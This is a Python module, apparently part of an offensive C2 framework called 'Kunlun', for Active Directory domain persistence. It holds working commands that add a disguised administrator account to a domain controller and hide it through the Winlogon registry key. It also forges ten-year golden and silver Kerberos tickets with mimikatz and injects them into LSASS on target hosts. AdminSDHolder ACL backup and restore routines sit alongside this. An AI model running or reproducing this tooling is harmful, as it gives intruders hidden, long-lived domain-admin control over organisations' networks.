"""Domain persistence and recovery module for Kunlun platform.

Provides:
- AdminSDHolder ACL backup and recovery
- Hidden local account persistence on domain controllers
- Long-term Kerberos ticket generation (golden/silver tickets)
- krbtgt hash history exploitation
"""

import asyncio
import logging
import secrets
import string
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


class PersistenceType(Enum):
    """Persistence mechanism types."""
    ADMINSDHOLDER = "adminsdholder"
    HIDDEN_ACCOUNT = "hidden_account"
    GOLDEN_TICKET = "golden_ticket"
    SILVER_TICKET = "silver_ticket"


class RecoveryStatus(Enum):
    """Recovery operation status."""
    BACKED_UP = "backed_up"
    RECOVERED = "recovered"
    MODIFIED = "modified"
    CLEANED = "cleaned"
    FAILED = "failed"


@dataclass
class ACLBackup:
    """AdminSDHolder ACL backup data.

    Attributes:
        object_dn: Distinguished name of the object
        sddl: Security Descriptor Definition Language string
        backup_timestamp: Backup timestamp
        modified: Whether ACL has been modified since backup
        original_owner: Original owner SID
    """
    object_dn: str = ""
    sddl: str = ""
    backup_timestamp: float = 0.0
    modified: bool = False
    original_owner: str = ""


@dataclass
class HiddenAccountConfig:
    """Configuration for hidden local account.

    Attributes:
        target_dc: Target domain controller
        account_name: Account name (disguised as system default)
        account_password: Account password
        is_domain_admin: Whether account has domain admin privileges
        hide_via_registry: Whether to hide via registry
    """
    target_dc: str = ""
    account_name: str = "DefaultAccount"
    account_password: str = ""
    is_domain_admin: bool = True
    hide_via_registry: bool = True


@dataclass
class TicketConfig:
    """Configuration for long-term Kerberos tickets.

    Attributes:
        target_domain: Target domain
        target_user: Target user for ticket
        krbtgt_hash: krbtgt NTLM hash
        ticket_type: Ticket type (golden/silver)
        validity_years: Ticket validity in years
        inject_to_lsass: Whether to inject to LSASS
        target_hosts: List of hosts for LSASS injection
        use_krbtgt_history: Whether to use krbtgt hash history
    """
    target_domain: str = ""
    target_user: str = "administrator"
    krbtgt_hash: str = ""
    ticket_type: str = "golden"
    validity_years: int = 10
    inject_to_lsass: bool = False
    target_hosts: List[str] = field(default_factory=list)
    use_krbtgt_history: bool = False


@dataclass
class PersistenceResult:
    """Result of persistence operation.

    Attributes:
        success: Whether operation succeeded
        persistence_type: Type of persistence
        account_name: Created account name (if applicable)
        ticket_data: Ticket data (if applicable)
        acl_backup: ACL backup data (if applicable)
        recovery_status: Recovery status
        error_message: Error message if failed
        attck_technique: Associated ATT&CK technique ID
        duration_seconds: Operation duration
        target_dc: Target domain controller
    """
    success: bool = False
    persistence_type: PersistenceType = PersistenceType.ADMINSDHOLDER
    account_name: str = ""
    ticket_data: str = ""
    acl_backup: Optional[ACLBackup] = None
    recovery_status: RecoveryStatus = RecoveryStatus.FAILED
    error_message: str = ""
    attck_technique: str = "T1098"
    duration_seconds: float = 0.0
    target_dc: str = ""


class DomainPersistenceRecovery:
    """Domain persistence and recovery module.

    Provides AdminSDHolder ACL backup/recovery, hidden local account
    persistence, and long-term Kerberos ticket generation.
    """

    DISGUISED_ACCOUNT_NAMES: List[str] = [
        "DefaultAccount",
        "WDAGUtilityAccount",
        "Guest",
        "krbtgt",
        "SystemAccount",
    ]

    def __init__(
        self,
        c2_session: Optional[Any] = None,
        credential_db: Optional[Any] = None,
        event_bus: Optional[Any] = None,
    ) -> None:
        """Initialize domain persistence and recovery module.

        Args:
            c2_session: C2 framework session for command execution.
            credential_db: Credential database for storing results.
            event_bus: Event bus for broadcasting events.
        """
        self.c2_session = c2_session
        self.credential_db = credential_db
        self.event_bus = event_bus
        self._progress_callback: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None
        self._log_callback: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None
        self._acl_backups: Dict[str, ACLBackup] = {}

    def set_callbacks(
        self,
        progress_cb: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None,
        log_cb: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None,
    ) -> None:
        """Set progress and log callbacks.

        Args:
            progress_cb: Callback for progress updates (message, percentage).
            log_cb: Callback for log messages.
        """
        self._progress_callback = progress_cb
        self._log_callback = log_cb

    async def _report_progress(self, message: str, percentage: float) -> None:
        """Report progress via callback.

        Args:
            message: Progress message.
            percentage: Progress percentage (0-100).
        """
        if self._progress_callback:
            await self._progress_callback(message, percentage)
        logger.info("Persistence Progress: %.1f%% - %s", percentage, message)

    async def _report_log(self, message: str) -> None:
        """Report log via callback.

        Args:
            message: Log message.
        """
        if self._log_callback:
            await self._log_callback(message)
        logger.info("Persistence: %s", message)

    async def _execute_command(self, command: str, target: str = "") -> Dict[str, Any]:
        """Execute command via C2 session.

        Args:
            command: Command to execute.
            target: Target host.

        Returns:
            Command execution result.
        """
        if self.c2_session:
            try:
                result = await self.c2_session.execute(command, target=target)
                return {"success": True, "output": result}
            except Exception as e:
                return {"success": False, "error": str(e)}
        return {"success": False, "error": "No C2 session available"}

    async def backup_adminsdholder_acl(self, target_dc: str = "") -> PersistenceResult:
        """Backup AdminSDHolder object ACL.

        Args:
            target_dc: Target domain controller.

        Returns:
            PersistenceResult with backup status.
        """
        start_time = time.time()
        result = PersistenceResult(
            persistence_type=PersistenceType.ADMINSDHOLDER,
            target_dc=target_dc,
        )

        try:
            await self._report_progress("备份AdminSDHolder ACL", 10)
            await self._report_log("开始备份AdminSDHolder对象ACL...")

            cmd = (
                "Get-ADObject -Identity "
                "\"CN=AdminSDHolder,CN=System,DC=domain,DC=com\" "
                "-Properties nTSecurityDescriptor | "
                "Select-Object -ExpandProperty nTSecurityDescriptor | "
                "Format-List"
            )
            exec_result = await self._execute_command(cmd, target_dc)

            if not exec_result.get("success"):
                result.error_message = "AdminSDHolder ACL备份失败"
                result.recovery_status = RecoveryStatus.FAILED
                result.duration_seconds = time.time() - start_time
                return result

            output = str(exec_result.get("output", ""))
            backup = ACLBackup(
                object_dn="CN=AdminSDHolder,CN=System,DC=domain,DC=com",
                sddl=output,
                backup_timestamp=time.time(),
                modified=False,
            )

            self._acl_backups[target_dc or "default"] = backup
            result.acl_backup = backup
            result.recovery_status = RecoveryStatus.BACKED_UP
            result.success = True

            await self._report_log("AdminSDHolder ACL备份成功")
            result.duration_seconds = time.time() - start_time

        except Exception as e:
            result.error_message = str(e)
            result.recovery_status = RecoveryStatus.FAILED
            result.duration_seconds = time.time() - start_time
            await self._report_log(f"AdminSDHolder ACL备份失败: {e}")
            logger.error("AdminSDHolder ACL backup failed: %s", e)

        return result

    async def recover_adminsdholder_acl(self, target_dc: str = "") -> PersistenceResult:
        """Recover AdminSDHolder object ACL from backup.

        Args:
            target_dc: Target domain controller.

        Returns:
            PersistenceResult with recovery status.
        """
        start_time = time.time()
        result = PersistenceResult(
            persistence_type=PersistenceType.ADMINSDHOLDER,
            target_dc=target_dc,
        )

        try:
            await self._report_progress("恢复AdminSDHolder ACL", 10)
            await self._report_log("开始恢复AdminSDHolder对象ACL...")

            backup_key = target_dc or "default"
            if backup_key not in self._acl_backups:
                result.error_message = "未找到AdminSDHolder ACL备份"
                result.recovery_status = RecoveryStatus.FAILED
                result.duration_seconds = time.time() - start_time
                return result

            backup = self._acl_backups[backup_key]
            await self._report_log(f"使用备份时间: {time.ctime(backup.backup_timestamp)}")

            cmd = (
                "Set-ADObject -Identity "
                "\"CN=AdminSDHolder,CN=System,DC=domain,DC=com\" "
                f"-Replace @{{nTSecurityDescriptor='{backup.sddl}'}}"
            )
            exec_result = await self._execute_command(cmd, target_dc)

            if exec_result.get("success"):
                result.recovery_status = RecoveryStatus.RECOVERED
                result.success = True
                await self._report_log("AdminSDHolder ACL恢复成功")
            else:
                result.error_message = "AdminSDHolder ACL恢复失败"
                result.recovery_status = RecoveryStatus.FAILED

            result.duration_seconds = time.time() - start_time

        except Exception as e:
            result.error_message = str(e)
            result.recovery_status = RecoveryStatus.FAILED
            result.duration_seconds = time.time() - start_time
            await self._report_log(f"AdminSDHolder ACL恢复失败: {e}")
            logger.error("AdminSDHolder ACL recovery failed: %s", e)

        return result

    async def detect_adminsdholder_modification(self, target_dc: str = "") -> bool:
        """Detect if AdminSDHolder has been modified.

        Args:
            target_dc: Target domain controller.

        Returns:
            True if AdminSDHolder has been modified.
        """
        try:
            backup_key = target_dc or "default"
            if backup_key not in self._acl_backups:
                await self._report_log("无备份数据，无法检测修改")
                return False

            cmd = (
                "Get-ADObject -Identity "
                "\"CN=AdminSDHolder,CN=System,DC=domain,DC=com\" "
                "-Properties nTSecurityDescriptor | "
                "Select-Object -ExpandProperty nTSecurityDescriptor"
            )
            exec_result = await self._execute_command(cmd, target_dc)

            if exec_result.get("success"):
                current_sddl = str(exec_result.get("output", "")).strip()
                backup = self._acl_backups[backup_key]
                if current_sddl != backup.sddl:
                    backup.modified = True
                    await self._report_log("检测到AdminSDHolder已被修改")
                    return True

            return False

        except Exception as e:
            logger.error("AdminSDHolder modification detection failed: %s", e)
            return False

    async def create_hidden_account(self, config: HiddenAccountConfig) -> PersistenceResult:
        """Create hidden local account on domain controller.

        Args:
            config: Hidden account configuration.

        Returns:
            PersistenceResult with account creation status.
        """
        start_time = time.time()
        result = PersistenceResult(
            persistence_type=PersistenceType.HIDDEN_ACCOUNT,
            target_dc=config.target_dc,
            account_name=config.account_name,
        )

        try:
            await self._report_progress("创建隐藏本地账户", 10)
            await self._report_log(f"开始创建隐藏本地账户: {config.account_name}")

            password = config.account_password if config.account_password else self._generate_password(20)
            result.account_name = config.account_name

            await self._report_progress("创建本地账户", 30)
            create_cmd = (
                f"net user {config.account_name} \"{password}\" /add "
                f"/fullname:\"System Account\" /comment:\"System Default Account\""
            )
            exec_result = await self._execute_command(create_cmd, config.target_dc)

            if not exec_result.get("success"):
                result.error_message = "本地账户创建失败"
                result.duration_seconds = time.time() - start_time
                return result

            await self._report_log("本地账户创建成功")

            if config.is_domain_admin:
                await self._report_progress("添加域管权限", 60)
                add_cmd = f"net localgroup \"Administrators\" {config.account_name} /add"
                await self._execute_command(add_cmd, config.target_dc)
                await self._report_log("已添加Administrators组权限")

            if config.hide_via_registry:
                await self._report_progress("隐藏账户注册表", 80)
                hide_cmd = (
                    f"New-ItemProperty "
                    f"\"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" "
                    f"-Name \"{config.account_name}\" -Value 0 -PropertyType DWord -Force"
                )
                await self._execute_command(hide_cmd, config.target_dc)
                await self._report_log("账户已通过注册表隐藏")

            result.success = True
            result.recovery_status = RecoveryStatus.MODIFIED
            result.duration_seconds = time.time() - start_time

            await self._report_progress("完成", 100)
            await self._report_log("隐藏本地账户创建成功!")

        except Exception as e:
            result.error_message = str(e)
            result.duration_seconds = time.time() - start_time
            await self._report_log(f"隐藏本地账户创建失败: {e}")
            logger.error("Hidden account creation failed: %s", e)

        return result

    async def cleanup_hidden_account(self, account_name: str, target_dc: str = "") -> bool:
        """Cleanup hidden local account and registry entries.

        Args:
            account_name: Account name to clean up.
            target_dc: Target domain controller.

        Returns:
            True if cleanup successful.
        """
        try:
            await self._report_log(f"开始清理隐藏账户: {account_name}")

            delete_cmd = f"net user {account_name} /delete"
            exec_result = await self._execute_command(delete_cmd, target_dc)
            if exec_result.get("success"):
                await self._report_log("账户删除成功")
            else:
                await self._report_log("警告: 账户删除失败")

            reg_cmd = (
                f"Remove-ItemProperty "
                f"\"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" "
                f"-Name \"{account_name}\" -Force -ErrorAction SilentlyContinue"
            )
            await self._execute_command(reg_cmd, target_dc)
            await self._report_log("注册表残留已清理")

            return True

        except Exception as e:
            logger.error("Hidden account cleanup failed: %s", e)
            return False

    async def generate_long_term_ticket(self, config: TicketConfig) -> PersistenceResult:
        """Generate long-term Kerberos ticket.

        Args:
            config: Ticket configuration.

        Returns:
            PersistenceResult with ticket generation status.
        """
        start_time = time.time()
        result = PersistenceResult(
            persistence_type=PersistenceType.GOLDEN_TICKET
            if config.ticket_type == "golden"
            else PersistenceType.SILVER_TICKET,
            target_dc=config.target_domain,
        )

        try:
            await self._report_progress("生成长期票据", 10)
            ticket_type_display = "黄金票据" if config.ticket_type == "golden" else "白银票据"
            await self._report_log(f"开始生成{ticket_type_display} (有效期: {config.validity_years}年)")

            if config.use_krbtgt_history:
                await self._report_log("使用krbtgt哈希历史生成隐蔽票据...")

            validity_seconds = config.validity_years * 365 * 24 * 60 * 60

            if config.ticket_type == "golden":
                cmd = (
                    f"mimikatz kerberos::golden "
                    f"/user:{config.target_user} "
                    f"/domain:{config.target_domain} "
                    f"/sid:S-1-5-21-xxx "
                    f"/krbtgt:{config.krbtgt_hash} "
                    f"/id:500 "
                    f"/startoffset:0 "
                    f"/endin:{validity_seconds} "
                    f"/ticket:golden_ticket.kirbi"
                )
            else:
                cmd = (
                    f"mimikatz kerberos::golden "
                    f"/user:{config.target_user} "
                    f"/domain:{config.target_domain} "
                    f"/sid:S-1-5-21-xxx "
                    f"/target:server.domain.com "
                    f"/rc4:{config.krbtgt_hash} "
                    f"/service:cifs "
                    f"/id:500 "
                    f"/startoffset:0 "
                    f"/endin:{validity_seconds} "
                    f"/ticket:silver_ticket.kirbi"
                )

            exec_result = await self._execute_command(cmd)

            if exec_result.get("success"):
                output = str(exec_result.get("output", ""))
                result.ticket_data = output
                result.success = True
                result.recovery_status = RecoveryStatus.MODIFIED
                await self._report_log(f"{ticket_type_display}生成成功")

                if config.inject_to_lsass and config.target_hosts:
                    await self._report_progress("注入LSASS进程", 70)
                    await self._inject_ticket_to_lsass(
                        result.ticket_data,
                        config.target_hosts,
                    )

            else:
                result.error_message = f"{ticket_type_display}生成失败"

            result.duration_seconds = time.time() - start_time
            await self._report_progress("完成", 100)

        except Exception as e:
            result.error_message = str(e)
            result.duration_seconds = time.time() - start_time
            await self._report_log(f"长期票据生成失败: {e}")
            logger.error("Long-term ticket generation failed: %s", e)

        return result

    async def _inject_ticket_to_lsass(self, ticket_data: str, target_hosts: List[str]) -> bool:
        """Inject ticket to LSASS process on target hosts.

        Args:
            ticket_data: Ticket data to inject.
            target_hosts: List of target hosts.

        Returns:
            True if injection successful.
        """
        success_count = 0

        try:
            for host in target_hosts:
                cmd = f"mimikatz kerberos::ptt {ticket_data}"
                exec_result = await self._execute_command(cmd, host)
                if exec_result.get("success"):
                    success_count += 1
                    await self._report_log(f"票据注入成功: {host}")

            await self._report_log(f"票据注入完成: {success_count}/{len(target_hosts)} 台主机成功")
            return success_count > 0

        except Exception as e:
            logger.error("Ticket injection failed: %s", e)
            return False

    def _generate_password(self, length: int) -> str:
        """Generate random password.

        Args:
            length: Password length.

        Returns:
            Random password.
        """
        chars = string.ascii_letters + string.digits + "!@#$%^&*"
        return "".join(secrets.choice(chars) for _ in range(length))
